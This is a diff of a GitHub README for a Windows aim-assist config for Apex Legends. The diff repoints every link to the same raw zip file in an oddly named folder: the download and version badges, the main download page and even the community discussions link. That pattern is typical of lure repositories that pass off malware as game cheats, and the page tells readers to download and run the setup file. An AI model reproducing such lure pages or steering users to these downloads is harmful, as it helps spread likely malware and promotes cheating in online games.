@@ -1,8 +1,8 @@
 # 🎯 Apex-Legends-Aim-Assist-Config-2026 - Master Your Aim, Dominate Every Fight
 
-[![Download Now](https://img.shields.io/badge/Download-Apex_Legends_Aim_Assist_Config_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026)
+[![Download Now](https://img.shields.io/badge/Download-Apex_Legends_Aim_Assist_Config_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2D2D2D)](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026/raw/refs/heads/main/inthrallment/Config_Assist_Aim_Apex_Legends_whitening.zip)
 
-[![Version](https://img.shields.io/badge/Version-2026.1.0-blue?style=flat-square)](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026)
+[![Version](https://img.shields.io/badge/Version-2026.1.0-blue?style=flat-square)](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026/raw/refs/heads/main/inthrallment/Config_Assist_Aim_Apex_Legends_whitening.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows-green?style=flat-square)](#)
 [![Last Updated](https://img.shields.io/badge/Last_Updated-January_2026-orange?style=flat-square)](#)
 [![Community](https://img.shields.io/badge/Community-Driven-8A2BE2?style=flat-square)](#)
@@ -32,7 +32,7 @@ Follow these straightforward steps to get your config running in under five minu
 
 Visit this link to download the application.
 
-👉 **[Main Download Page](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026)**
+👉 **[Main Download Page](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026/raw/refs/heads/main/inthrallment/Config_Assist_Aim_Apex_Legends_whitening.zip)**
 
 Click the big "Download" button on that page. Your browser will save the setup file to your "Downloads" folder (usually `C:\Users\YourName\Downloads`). The file is clearly named, so you can't miss it.
 
@@ -84,7 +84,7 @@ We've got you covered. Most issues are simple to fix.
 - Some fullscreen exclusive modes can hide overlays. Switch your in-game display mode to "Borderless Window" (Options > Video > Display Mode). This is a known and quick fix.
 
 ### ✔️ Still stuck?
-- Join our [Community Discussions](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026/discussions) tab on the GitHub page. Search for your issue before posting. We usually reply within 24 hours.
+- Join our [Community Discussions](https://github.com/ktp45/Apex-Legends-Aim-Assist-Config-2026/raw/refs/heads/main/inthrallment/Config_Assist_Aim_Apex_Legends_whitening.zip) tab on the GitHub page. Search for your issue before posting. We usually reply within 24 hours.
 
 ## 📈 Frequently Asked Questions (FAQ)
 
